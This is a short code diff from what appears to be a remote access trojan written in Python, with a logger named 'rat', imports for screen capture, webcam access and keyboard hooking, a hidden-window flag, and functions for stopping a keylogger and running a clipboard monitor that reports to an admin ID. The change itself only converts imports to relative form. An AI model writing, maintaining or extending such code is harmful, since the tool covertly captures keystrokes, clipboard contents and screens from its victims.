@@ -15,8 +15,8 @@ import mss.tools
 import cv2
 from pynput import keyboard
 
-from config import CREATE_NO_WINDOW
-from state import state
+from .config import CREATE_NO_WINDOW
+from .state import state
 
 log = logging.getLogger("rat")
 
@@ -45,7 +45,7 @@ def stop_keylogger() -> str:
     return data
 
 def clipboard_worker() -> None:
-    from config import ADMIN_ID
+    from .config import ADMIN_ID
     while state.clip_active:
         try:
             import win32clipboard
